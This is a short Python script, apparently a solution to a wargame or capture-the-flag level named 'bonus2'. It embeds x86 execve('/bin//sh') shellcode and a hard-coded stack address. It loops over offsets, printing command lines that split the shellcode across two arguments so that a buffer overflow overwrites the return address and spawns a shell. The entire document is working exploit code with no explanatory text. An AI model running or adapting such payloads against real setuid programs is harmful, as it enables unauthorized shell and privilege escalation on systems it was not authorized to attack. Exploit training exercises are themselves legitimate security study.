shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"



def swap32(x):
    return (((x << 24) & 0xFF000000) |
            ((x <<  8) & 0x00FF0000) |
            ((x >>  8) & 0x0000FF00) |
            ((x >> 24) & 0x000000FF))

start_offset = 0xbffff5ce
left_length = 40
right_length = 18

for i in range(left_length + right_length -len(shellcode)):
	left_cmd = ("A" * (left_length - len(shellcode[:left_length - i]))) + shellcode[:left_length - i]
	right_cmd = shellcode[left_length - i:] + ("B" * (right_length - len(shellcode[left_length - i:])))
	h = f'{swap32(start_offset + i):08x}'
	right_cmd += chr(int(h[0:2], 16)) + chr(int(h[2:4], 16)) + chr(int(h[4:6], 16)) + chr(int(h[6:8], 16))
	print(f'LANG=fi ./bonus2 $(python -c \'print "{ascii(left_cmd)[1:-1]}",\') $(python -c \'print "{ascii(right_cmd)[1:-1]}",\')')
	input()
